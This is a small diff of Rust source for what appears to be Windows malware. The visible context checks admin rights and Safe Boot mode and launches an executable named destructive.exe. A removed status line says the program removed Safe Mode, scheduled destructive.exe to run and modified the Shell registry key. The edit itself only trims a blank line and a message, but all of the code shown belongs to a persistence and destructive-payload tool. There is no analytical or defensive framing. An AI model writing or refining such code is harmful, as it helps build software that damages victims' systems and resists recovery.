@@ -7,7 +7,6 @@ use wmi::{WMIConnection, COMLibrary};
 use windows::Win32::System::SystemInformation::GetOsSafeBootMode;
 use windows::Win32::Foundation::BOOL;
 
-
 fn is_admin() -> bool {
     let output = Command::new("whoami")
         .arg("/groups")
@@ -256,7 +255,7 @@ fn main() -> io::Result<()> {
             let _ = Command::new(&executable_path).spawn(); // Ignore errors
         }
 
-        println!("[+] Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.");
+        println!("[+] Cleanup tasks completed. Safe Mode should now be removed.");
     } else {
         println!("[+] Safe Mode is not detected. Running destructive.exe directly...");
         if let Ok(program_files) = env::var("ProgramFiles") {
